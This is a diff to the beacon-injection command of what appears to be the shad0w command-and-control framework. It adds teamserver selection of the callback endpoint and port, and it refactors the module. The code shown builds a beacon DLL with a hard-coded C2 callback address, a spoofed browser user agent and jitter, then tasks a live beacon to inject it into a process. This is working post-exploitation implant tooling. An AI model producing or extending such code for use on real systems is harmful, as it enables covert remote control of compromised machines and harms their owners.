@@ -17,6 +17,12 @@ from lib.basecommand import BaseCommand
 DLLINJECT_EXEC_ID = 0x5000
 SHINJECT_EXEC_ID = 0x2000
 
+# beacon to exec command on
+current_beacon = None
+
+def binject_callback(shad0w, data):
+    # wont be hit
+    return
 
 def build_inject_info(args, rcode):
     # create the json object to tell the beacon
@@ -30,19 +36,26 @@ def build_inject_info(args, rcode):
 def generate_beacon_code(shad0w, beacon):
     buildtools.clone_source_files(rootdir='injectable')
 
+    if shad0w.teamserver:
+        endpoint = shad0w.teamsrv.c2_endpoint
+        port     = shad0w.teamsrv.c2_port
+    else:
+        endpoint = shad0w.endpoint
+        port     = shad0w.addr[1]
+
     settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
 #define _C2_CALLBACK_PORT %s
 #define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
 #define _CALLBACK_JITTER %s000
 #define IMPERSONATE_SESSION "%s"
-""" % (shad0w.endpoint, shad0w.addr[1], 1, None)
+""" % (endpoint, port, 1, None)
 
     buildtools.update_settings_file(None, custom_template=settings_template)
 
     if beacon is None:
-        os = shad0w.beacons[shad0w.current_beacon]["os"]
-        arch = shad0w.beacons[shad0w.current_beacon]["arch"]
-        secure = shad0w.beacons[shad0w.current_beacon]["secure"]
+        os = shad0w.beacons[current_beacon]["os"]
+        arch = shad0w.beacons[current_beacon]["arch"]
+        secure = shad0w.beacons[current_beacon]["secure"]
     else:
         arch, arch, secure, _ = buildtools.get_payload_variables(beacon)
 
@@ -99,7 +112,7 @@ def generate_beacon_dll(shad0w, rcode):
 
     # check that the dll has built
     if not made:
-        shad0w.debug.error("Error building migrate dll")
+        shad0w.event.beacon_info(current_beacon, "Error building migrate dll")
         return
 
     # return the base64 dll data
@@ -107,8 +120,10 @@ def generate_beacon_dll(shad0w, rcode):
 
 
 class BinjectCommand(BaseCommand):
-    def __init__(self, args):
+    def __init__(self, args, beacon):
         BaseCommand.__init__(self, "binject", args)
+
+        self.beacon = beacon
 
     def get_usage(self):
         return """
@@ -134,16 +149,17 @@ binject -b x64/windows/secure -p 9207
         inject_info = build_inject_info(self.args, rcode)
 
         # tell the beacon to execute the dll
-        shad0w.beacons[shad0w.current_beacon]["task"] = (DLLINJECT_EXEC_ID, inject_info)
+        shad0w.beacons[self.beacon]["task"] = (DLLINJECT_EXEC_ID, inject_info)
+        shad0w.beacons[self.beacon]["callback"] = binject_callback
 
 
-def main(shad0w, args):
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
-        return
+def main(shad0w, args, beacon):
+    global current_beacon
 
-    cmd = BinjectCommand(args)
+    # make beacon global
+    current_beacon = beacon
+
+    cmd = BinjectCommand(args, beacon)
     if cmd.parse() is True:
         cmd.run(shad0w)
 
